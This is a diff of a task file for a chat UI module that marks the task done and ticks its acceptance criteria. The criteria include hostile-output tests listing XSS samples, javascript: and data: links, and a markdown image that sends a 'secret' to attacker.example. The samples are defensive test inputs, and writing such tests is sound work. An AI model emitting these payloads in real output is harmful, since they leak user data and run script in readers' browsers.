@@ -2,7 +2,7 @@
 
 - **Lane:** U · **Module:** `apps/engine-ui` · **Milestone:** M2
 - **Depends on:** U-02
-- **Status:** todo
+- **Status:** done (#35)
 - **Spec:** Security hardening (5 agent output is untrusted, 6 tool calls never become code), Build plan (spike: SSE through the passthrough); ADRs: [0003](../../adr/0003-ui-as-signed-bundle.md)
 
 ## Goal
@@ -45,23 +45,23 @@ Agent output is attacker-controlled the moment an agent reads a web page or a do
 
 ## Acceptance criteria
 
-- [ ] Streaming test: deltas appear in order; markdown renders only after `completed`; the live region announces once.
-- [ ] Stop test: aborts the iterable, calls the cancel endpoint once with the reply's message ID, keeps the partial text and marks it stopped; a second click does nothing.
-- [ ] Dropped stream and `failed` event each show their state; Retry re-sends only on click.
-- [ ] Hostile output tests (each asserts the DOM and that no `img`, `script`, `iframe` or `a[href]` with a forbidden scheme exists):
-  - [ ] `![x](https://attacker.example/?d=secret)` renders no `<img>` and starts no request (spy on `fetch` and image loads);
-  - [ ] `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` render as literal text;
-  - [ ] `[click](javascript:alert(1))`, `[x](data:text/html,…)`, `[x](/v1/agents/1)` render as text without `href`;
-  - [ ] `[docs](https://example.com/a)` renders an external link with `rel="noopener noreferrer"`.
-- [ ] Code block test: a TypeScript block yields highlight spans; an unknown language renders as plain text; copy puts the exact text on the clipboard.
-- [ ] `test:csp` sends a message against the in-memory client's scripted reply containing the hostile samples and records zero violations and zero non-`'self'` requests.
-- [ ] Keyboard: send, newline, stop and jump-to-latest work without a mouse; `axe-core` passes.
-- [ ] Optimistic send: a failed send removes the message, restores the composer text and shows an error toast.
-- [ ] A chat with 2,000 seeded messages mounts only the visible window, loads older pages on scroll up without jumping, and jump-to-latest reaches the newest message.
-- [ ] Chat list: source filter and cursor are written to the URL and restored on reload; empty, error and not-found states each have a test.
-- [ ] `test:csp` passes the UX checks (360 px without overflow, layout shift, reduced motion) on the chat list and a chat; both routes stay within their bundle budgets (lazily loaded language parsers do not count toward the route).
-- [ ] `bun run check` passes.
-- [ ] **Status** line above set to `done (#<PR>)`.
+- [x] Streaming test: deltas appear in order; markdown renders only after `completed`; the live region announces once.
+- [x] Stop test: aborts the iterable, calls the cancel endpoint once with the reply's message ID, keeps the partial text and marks it stopped; a second click does nothing.
+- [x] Dropped stream and `failed` event each show their state; Retry re-sends only on click.
+- [x] Hostile output tests (each asserts the DOM and that no `img`, `script`, `iframe` or `a[href]` with a forbidden scheme exists):
+  - [x] `![x](https://attacker.example/?d=secret)` renders no `<img>` and starts no request (spy on `fetch` and image loads);
+  - [x] `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` render as literal text;
+  - [x] `[click](javascript:alert(1))`, `[x](data:text/html,…)`, `[x](/v1/agents/1)` render as text without `href`;
+  - [x] `[docs](https://example.com/a)` renders an external link with `rel="noopener noreferrer"`.
+- [x] Code block test: a TypeScript block yields highlight spans; an unknown language renders as plain text; copy puts the exact text on the clipboard.
+- [x] `test:csp` sends a message against the in-memory client's scripted reply containing the hostile samples and records zero violations and zero non-`'self'` requests.
+- [x] Keyboard: send, newline, stop and jump-to-latest work without a mouse; `axe-core` passes.
+- [x] Optimistic send: a failed send removes the message, restores the composer text and shows an error toast.
+- [x] A chat with 2,000 seeded messages mounts only the visible window, loads older pages on scroll up without jumping, and jump-to-latest reaches the newest message.
+- [x] Chat list: source filter and cursor are written to the URL and restored on reload; empty, error and not-found states each have a test.
+- [x] `test:csp` passes the UX checks (360 px without overflow, layout shift, reduced motion) on the chat list and a chat; both routes stay within their bundle budgets (lazily loaded language parsers do not count toward the route).
+- [x] `bun run check` passes.
+- [x] **Status** line above set to `done (#<PR>)`.
 
 ## Risks and open points
 
